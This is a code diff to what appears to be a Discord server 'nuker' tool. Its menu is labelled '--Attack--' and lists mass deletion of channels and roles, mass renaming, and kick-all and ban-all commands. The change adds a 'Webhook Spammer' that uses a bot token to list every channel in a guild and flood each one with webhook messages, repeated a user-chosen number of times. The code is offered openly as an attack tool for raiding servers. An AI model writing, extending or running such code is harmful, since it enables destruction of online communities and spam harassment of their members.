@@ -21,7 +21,7 @@ banner="""
 ░░╚██╔╝░░███████╗
 ░░░╚═╝░░░╚══════╝
 """
-version="alpha 1.9 - v2"
+version="beta 2.0 - v2"
 def printcolor(text):
     print(Colorate.Horizontal(Colors.purple_to_blue,text,1))
 #count sucess and fail
@@ -109,7 +109,7 @@ while True:
     printcolor("--Attack--")
     printcolor("[1] Create Channels         [2] Delete Channels         [3] Create Roles        [4] Delete Roles")
     printcolor("[5] Rename Channels         [6] Rename Roles            [7] Rename User         [8] Rename Emojis")
-    printcolor("[9] Kick all                [10] Ban all                [11] Unban all")
+    printcolor("[9] Kick all                [10] Ban all                [11] Unban all          [12] Webhook Spammer")
     print()
     printcolor("--Server Config--")
     cmd=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
@@ -250,10 +250,14 @@ while True:
         printcolor("Finished")
         time.sleep(1.5)
         countsucessfail()
-    elif cmd=="serverchangename":
-        printcolor("New server name:")
+    elif cmd=="12":
+        printcolor("Message Content:")
         new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
-        os.system(f"start src/changeservername.pyw {guildid} {token} {new}")
-        printcolor("Finished")
-        time.sleep(1.5)
+        printcolor("Repeat how many times:")
+        new1=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
+        for channel in api.json():
+            os.system(f"start src/webhookcreate.pyw {token} {channel['id']} {new} {new1}")
+            printcolor(f"Requested to create and send webhook at {channel['name']}")
+        time.sleep(2)
         countsucessfail()
